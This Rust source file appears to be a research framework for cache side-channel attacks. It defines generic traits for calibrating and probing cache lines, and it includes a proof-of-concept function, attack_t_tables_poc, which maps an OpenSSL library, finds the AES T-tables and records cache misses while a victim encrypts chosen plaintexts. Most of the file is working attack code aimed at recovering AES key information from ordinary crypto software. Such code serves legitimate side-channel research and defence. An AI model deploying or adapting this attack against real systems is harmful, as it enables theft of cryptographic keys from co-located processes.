#![feature(specialization)]
#![feature(unsafe_block_in_unsafe_fn)]
#![deny(unsafe_op_in_unsafe_fn)]

use openssl::aes;

use crate::CacheStatus::Miss;
use memmap2::Mmap;
use openssl::aes::aes_ige;
use openssl::symm::Mode;
use std::collections::HashMap;
use std::fmt::Debug;
use std::fs::File;
use std::path::Path;

pub mod naive_flush_and_reload;
// Generic AES T-table attack flow

// Modularisation :
// The module handles loading, then passes the relevant target infos to a attack strategy object for calibration
// Then the module runs the attack, calling the attack strategy to make a measurement and return hit/miss

// interface for attack : run victim (eat a closure)
// interface for measure : give measurement target.

// Can attack strategies return err ?

// Load a vulnerable openssl - determine adresses af the T tables ?
// Run the calibrations
// Then start the attacks

// This is a serialized attack - either single threaded or synchronised

// parameters required

// an attacker measurement
// a calibration victim
#[derive(Debug, PartialEq, Eq, Clone, Copy)]
pub enum CacheStatus {
    Hit,
    Miss,
}

#[derive(Debug, PartialEq, Eq, Clone, Copy)]
pub enum ChannelFatalError {
    Oops,
}

pub enum SideChannelError {
    NeedRecalibration,
    FatalError(ChannelFatalError),
    AddressNotReady(*const u8),
    AddressNotCalibrated(*const u8),
}

/*
pub enum CacheSideChannel {
    SingleAddr,
    MultipleAddr,
}
*/

// Access Driven

pub trait SimpleCacheSideChannel {
    // TODO
}

pub trait TableCacheSideChannel {
    //type ChannelFatalError: Debug;
    /// # Safety
    ///
    /// addresses must contain only valid pointers to read.
    unsafe fn calibrate(
        &mut self,
        addresses: impl IntoIterator<Item = *const u8> + Clone,
    ) -> Result<(), ChannelFatalError>;
    /// # Safety
    ///
    /// addresses must contain only valid pointers to read.
    unsafe fn attack<'a, 'b>(
        &'a mut self,
        addresses: impl IntoIterator<Item = *const u8> + Clone,
        victim: &'b dyn Fn(),
    ) -> Result<Vec<(*const u8, CacheStatus)>, ChannelFatalError>;
}

pub trait SingleAddrCacheSideChannel: Debug {
    //type SingleChannelFatalError: Debug;
    /// # Safety
    ///
    /// addr must be a valid pointer to read.
    unsafe fn test_single(&mut self, addr: *const u8) -> Result<CacheStatus, SideChannelError>;
    /// # Safety
    ///
    /// addr must be a valid pointer to read.
    unsafe fn prepare_single(&mut self, addr: *const u8) -> Result<(), SideChannelError>;
    fn victim_single(&mut self, operation: &dyn Fn());
    /// # Safety
    ///
    /// addresses must contain only valid pointers to read.
    unsafe fn calibrate_single(
        &mut self,
        addresses: impl IntoIterator<Item = *const u8> + Clone,
    ) -> Result<(), ChannelFatalError>;
}

pub trait MultipleAddrCacheSideChannel: Debug {
    //type MultipleChannelFatalError: Debug;

    /// # Safety
    ///
    /// addresses must contain only valid pointers to read.
    unsafe fn test(
        &mut self,
        addresses: impl IntoIterator<Item = *const u8> + Clone,
    ) -> Result<Vec<(*const u8, CacheStatus)>, SideChannelError>;

    /// # Safety
    ///
    /// addresses must contain only valid pointers to read.
    unsafe fn prepare(
        &mut self,
        addresses: impl IntoIterator<Item = *const u8> + Clone,
    ) -> Result<(), SideChannelError>;
    fn victim(&mut self, operation: &dyn Fn());

    /// # Safety
    ///
    /// addresses must contain only valid pointers to read.
    unsafe fn calibrate(
        &mut self,
        addresses: impl IntoIterator<Item = *const u8> + Clone,
    ) -> Result<(), ChannelFatalError>;
}

impl<T: SingleAddrCacheSideChannel> TableCacheSideChannel for T {
    default unsafe fn calibrate(
        &mut self,
        addresses: impl IntoIterator<Item = *const u8> + Clone,
    ) -> Result<(), ChannelFatalError> {
        unsafe { self.calibrate_single(addresses) }
    }
    //type ChannelFatalError = T::SingleChannelFatalError;

    default unsafe fn attack<'a, 'b, 'c>(
        &'a mut self,
        addresses: impl IntoIterator<Item = *const u8> + Clone,
        victim: &'c dyn Fn(),
    ) -> Result<Vec<(*const u8, CacheStatus)>, ChannelFatalError> {
        let mut result = Vec::new();

        for addr in addresses {
            match unsafe { self.prepare_single(addr) } {
                Ok(_) => {}
                Err(e) => match e {
                    SideChannelError::NeedRecalibration => unimplemented!(),
                    SideChannelError::FatalError(e) => return Err(e),
                    SideChannelError::AddressNotReady(_addr) => panic!(),
                    SideChannelError::AddressNotCalibrated(_addr) => unimplemented!(),
                },
            }
            self.victim_single(victim);
            let r = unsafe { self.test_single(addr) };
            match r {
                Ok(status) => {
                    result.push((addr, status));
                }
                Err(e) => match e {
                    SideChannelError::NeedRecalibration => panic!(),
                    SideChannelError::FatalError(e) => {
                        return Err(e);
                    }
                    _ => panic!(),
                },
            }
        }
        Ok(result)
    }
}

// TODO

impl<T: MultipleAddrCacheSideChannel> SingleAddrCacheSideChannel for T {
    unsafe fn test_single(&mut self, addr: *const u8) -> Result<CacheStatus, SideChannelError> {
        let addresses = vec![addr];
        unsafe { self.test(addresses) }.map(|v| v[0].1)
    }

    unsafe fn prepare_single(&mut self, addr: *const u8) -> Result<(), SideChannelError> {
        let addresses = vec![addr];
        unsafe { self.prepare(addresses) }
    }

    fn victim_single(&mut self, operation: &dyn Fn()) {
        self.victim(operation);
    }

    unsafe fn calibrate_single(
        &mut self,
        addresses: impl IntoIterator<Item = *const u8> + Clone,
    ) -> Result<(), ChannelFatalError> {
        unsafe { self.calibrate(addresses) }
    }
}

fn table_cache_side_channel_calibrate_impl<T: MultipleAddrCacheSideChannel>(
    s: &mut T,
    addresses: impl IntoIterator<Item = *const u8> + Clone,
) -> Result<(), ChannelFatalError> {
    unsafe { s.calibrate(addresses) }
}

impl<T: MultipleAddrCacheSideChannel> TableCacheSideChannel for T {
    unsafe fn calibrate(
        &mut self,
        addresses: impl IntoIterator<Item = *const u8> + Clone,
    ) -> Result<(), ChannelFatalError> {
        table_cache_side_channel_calibrate_impl(self, addresses)
        //self.calibrate(addresses)
    }
    //type ChannelFatalError = T::MultipleChannelFatalError;

    /// # Safety
    ///
    /// addresses must contain only valid pointers to read.
    unsafe fn attack<'a, 'b, 'c>(
        &'a mut self,
        addresses: impl IntoIterator<Item = *const u8> + Clone,
        victim: &'c dyn Fn(),
    ) -> Result<Vec<(*const u8, CacheStatus)>, ChannelFatalError> {
        match unsafe { MultipleAddrCacheSideChannel::prepare(self, addresses.clone()) } {
            Ok(_) => {}
            Err(e) => match e {
                SideChannelError::NeedRecalibration => unimplemented!(),
                SideChannelError::FatalError(e) => return Err(e),
                SideChannelError::AddressNotReady(_addr) => panic!(),
                SideChannelError::AddressNotCalibrated(_addr) => unimplemented!(),
            },
        }
        MultipleAddrCacheSideChannel::victim(self, victim);

        let r = unsafe { MultipleAddrCacheSideChannel::test(self, addresses) }; // Fixme error handling
        match r {
            Err(e) => match e {
                SideChannelError::NeedRecalibration => {
                    panic!();
                }
                SideChannelError::FatalError(e) => Err(e),
                _ => panic!(),
            },
            Ok(v) => Ok(v),
        }
    }
}

pub struct AESTTableParams<'a> {
    pub num_encryptions: u32,
    pub key: [u8; 32],
    pub openssl_path: &'a Path,
    pub te: [isize; 4],
}

/// # Safety
///
/// te need to refer to the correct t tables offset in the openssl library at path.
pub unsafe fn attack_t_tables_poc(
    side_channel: &mut impl TableCacheSideChannel,
    parameters: AESTTableParams,
) {
    // Note : This function doesn't handle the case where the address space is not shared. (Additionally you have the issue of complicated eviction sets due to complex addressing)
    // TODO

    // Possible enhancements : use ability to monitor several addresses simultaneously.
    let fd = File::open(parameters.openssl_path).unwrap();
    let mmap = unsafe { Mmap::map(&fd).unwrap() };
    let base = mmap.as_ptr();

    let te0 = unsafe { base.offset(parameters.te[0]) };
    if unsafe { (te0 as *const u64).read() } != 0xf87c7c84c66363a5 {
        panic!("Hmm This does not look like a T-table, check your address and the openssl used")
    }

    let key_struct = aes::AesKey::new_encrypt(&parameters.key).unwrap();

    //let mut plaintext = [0u8; 16];
    //let mut result = [0u8; 16];

    let mut timings: HashMap<*const u8, HashMap<u8, u32>> = HashMap::new();

    let addresses = parameters
        .te
        .iter()
        .map(|&start| ((start)..(start + 64 * 16)).step_by(64))
        .flatten()
        .map(|offset| unsafe { base.offset(offset) });

    unsafe { side_channel.calibrate(addresses.clone()).unwrap() };

    for addr in addresses.clone() {
        let mut timing = HashMap::new();
        for b in (u8::min_value()..=u8::max_value()).step_by(16) {
            timing.insert(b, 0);
        }
        timings.insert(addr, timing);
    }

    for b in (u8::min_value()..=u8::max_value()).step_by(16) {
        //plaintext[0] = b;
        eprintln!("Probing with b = {:x}", b);
        // fixme magic numbers

        let victim = || {
            let mut plaintext = [0u8; 16];
            plaintext[0] = b;
            for byte in plaintext.iter_mut().skip(1) {
                *byte = rand::random();
            }
            let mut iv = [0u8; 32];
            let mut result = [0u8; 16];
            aes_ige(&plaintext, &mut result, &key_struct, &mut iv, Mode::Encrypt);
        };

        for _ in 0..100 {
            let r = unsafe { side_channel.attack(addresses.clone(), &victim) };
            match r {
                Ok(v) => {
                    for (probe, status) in v {
                        if status == Miss {
                            *timings.get_mut(&probe).unwrap().entry(b).or_insert(0) += 0;
                        }
                    }
                }
                Err(_) => panic!("Attack failed"),
            }
        }

        for _ in 0..parameters.num_encryptions {
            let r = unsafe { side_channel.attack(addresses.clone(), &victim) };
            match r {
                Ok(v) => {
                    for (probe, status) in v {
                        if status == Miss {
                            *timings.get_mut(&probe).unwrap().entry(b).or_insert(0) += 1;
                        }
                    }
                }
                Err(_) => panic!("Attack failed"),
            }
        }
    }
    for probe in addresses {
        print!("{:p}", probe);
        for b in (u8::min_value()..=u8::max_value()).step_by(16) {
            print!(" {:4}", timings[&probe][&b]);
        }
        println!();
    }
}
